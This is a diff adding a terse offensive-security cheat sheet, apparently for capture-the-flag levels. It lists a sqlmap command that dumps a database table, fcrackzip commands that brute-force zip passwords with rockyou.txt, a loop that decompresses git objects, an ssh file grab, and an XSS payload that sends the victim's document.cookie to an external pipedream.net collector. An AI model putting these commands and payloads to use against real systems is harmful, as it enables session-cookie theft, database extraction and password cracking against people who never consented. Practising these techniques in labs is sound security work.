@@ -1,0 +1,18 @@
+#for .git/objects
+for f in .git/objects/*/*; do zlib-flate -uncompress < $f; done
+
+#sqlmap
+sqlmap -u "url" --dump -C name -T Users -D blog
+                             ^       ^        ^
+                         column     table     database
+
+#Downloading objects from ssh
+ssh level5@44.233.149.141 -p 3333 'cat /home/level5/chicken-little.png' > /mnt/c/users/andre/downloads/chicken-little.png
+
+#fcrackzip
+fcrackzip -v -u -D -p rockyou.txt sample.zip
+fcrackzip -b -D -p rockyou.txt -u Geheim.zip 
+
+#xss
+<script>document.write('<img src="https://envarnp225kx.x.pipedream.net/?cookie='+ encodeURIComponent(document.cookie) +'"/>')</script>
+
